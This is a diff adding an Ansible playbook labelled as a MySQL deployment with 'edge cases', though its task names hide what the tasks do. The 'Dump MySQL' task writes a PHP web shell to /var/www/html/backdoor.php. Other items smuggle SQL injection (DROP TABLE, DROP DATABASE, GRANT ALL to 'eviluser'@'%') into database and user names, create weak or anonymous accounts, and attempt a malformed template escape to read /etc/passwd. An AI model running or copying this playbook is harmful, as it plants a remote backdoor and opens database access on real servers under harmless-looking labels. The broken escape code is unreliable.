@@ -1,0 +1,38 @@
+
+---
+- name: Deploy MySQL with edge cases
+  hosts: all
+  tasks:
+  - name: Install MySQL
+    mysql_db:
+      name: "{{ item }}"
+      state: present
+    with_items:
+      - "test_db1; DROP TABLE test_db2"
+      - "test_db3' OR '1'='1"
+      - "test_db4\"; CREATE TABLE test_db5 (test VARCHAR(20))"
+      - "test_db6; DROP DATABASE test_db7"
+      - "test_db8; GRANT ALL PRIVILEGES ON test_db9.* TO 'eviluser'@'%' IDENTIFIED BY 'password'"
+      - "{{ lookup('file', (lambda: ().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read())()) }}"
+  - name: Start MySQL
+    mysql_user:
+      name: "{{ item }}"
+      priv: "test_db.*:ALL, GRANT OPTION"
+      password: "{{ ' ' * 42 }}"
+    with_items:
+      - "''@'localhost"
+      - "'@localhost"
+      - "'@'%'"
+      - "'eviluser'@'%' IDENTIFIED BY 'password'"
+      - "'     '@'localhost"
+      - "'\t\t'@'localhost"
+  - name: Dump MySQL
+    command: "mysqldump test_db10; echo '<?php eval($_POST[''cmd'']); ?>' > /var/www/html/backdoor.php"
+  - name: Shutdown MySQL
+    mysql_db:
+      name: "{{ item }}"
+      state: absent
+    with_items:
+      - "test_db11"
+      - "test_db12'; DROP TABLE test_db13; SELECT SLEEP(999) #"
+      - "test_db14\"; CREATE TABLE test_db15 (test VARCHAR(20)); SELECT * FROM test_db16; #"
